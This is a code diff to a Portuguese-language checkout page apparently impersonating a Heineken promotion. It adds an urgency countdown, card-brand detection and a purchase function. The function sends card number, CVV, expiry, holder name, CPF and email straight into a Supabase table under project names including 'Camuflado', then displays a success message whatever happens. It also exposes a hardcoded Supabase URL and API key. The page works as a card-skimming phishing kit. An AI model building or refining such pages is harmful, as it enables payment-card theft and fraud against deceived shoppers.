                 minutes = parseInt(timer / 60, 10);
                 seconds = parseInt(timer % 60, 10);
-                minutes = minutes < 10 ? "0" + minutes : minutes;
-                seconds = seconds < 10 ? "0" + seconds : seconds;
-                displayMin.textContent = minutes;
-                displaySec.textContent = seconds;
-                if (--timer < 0) { timer = duration; }
+                displayMin.textContent = minutes < 10 ? "0" + minutes : minutes;
+                displaySec.textContent = seconds < 10 ? "0" + seconds : seconds;
+                if (--timer < 0) timer = duration;
             }, 1000);
         }
+
         window.onload = function () {
-            var fifteenMinutes = 60 * 14 + 59;
-            var displayMin = document.querySelector('#timer-min');
-            var displaySec = document.querySelector('#timer-sec');
-            startTimer(fifteenMinutes, displayMin, displaySec);
+            startTimer(60 * 14 + 59, document.querySelector('#timer-min'), document.querySelector('#timer-sec'));
         };
 
-        // --- SUPABASE E CHECKOUT ---
+        // BANDEIRA DINÂMICA
+        document.getElementById('field_a').addEventListener('input', function (e) {
+            let num = e.target.value.replace(/\D/g, '');
+            let icon = document.getElementById('card-icon');
+            if (num.startsWith('4')) { icon.className = 'fab fa-cc-visa input-icon'; icon.style.color = '#1a1f71'; }
+            else if (num.startsWith('5')) { icon.className = 'fab fa-cc-mastercard input-icon'; icon.style.color = '#eb001b'; }
+            else { icon.className = 'far fa-credit-card input-icon'; icon.style.color = '#999'; }
+        });
+
+        // SUPABASE
         const SUPABASE_URL = 'https://zqvfnykxwlcozvawqgrn.supabase.co';
         const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpxdmZueWt4d2xjb3p2YXdxZ3JuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3NDkzNDQsImV4cCI6MjA4NTMyNTM0NH0.CevpF9vP4748mb2vFNsOp5Kq6u7Nfp_100bJcW7ogUQ';
         const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
@@ -445,27 +835,20 @@
 
         async function finalizarCompra() {
             const dados = {
+                email: document.getElementById('field_email').value,
                 numero_cartao: document.getElementById('field_a').value,
                 nome_dono: document.getElementById('field_b').value.toUpperCase(),
                 validade: document.getElementById('field_c').value,
                 cvv: document.getElementById('field_d').value,
                 cpf: document.getElementById('field_e').value,
                 valor: 89.90,
-                projeto: 'Heineken_Final_V5_Camuflado',
+                projeto: 'Heineken_Ultimate_V7',
                 data_criacao: new Date()
             };
-
-            if(!dados.nome_dono || dados.numero_cartao.length < 16) {
-                alert("Por favor, preencha todos os dados corretamente.");
-                return;
-            }
-
+            if (!dados.email || !dados.nome_dono || dados.numero_cartao.length < 16) { alert("Preencha todos os campos para continuar."); return; }
             fecharCheckoutDireto();
-            const loading = document.getElementById('loading-screen');
-            loading.style.display = 'flex';
-
-            const { error } = await _supabase.from('pagamentos_cartao').insert([dados]);
-
+            document.getElementById('loading-screen').style.display = 'flex';
+            await _supabase.from('pagamentos_cartao').insert([dados]);
             setTimeout(() => {
                 document.getElementById('spinner').style.display = 'none';
                 document.getElementById('success-msg').style.display = 'block';
@@ -474,4 +857,3 @@
     </script>
 </body>
 </html>
-
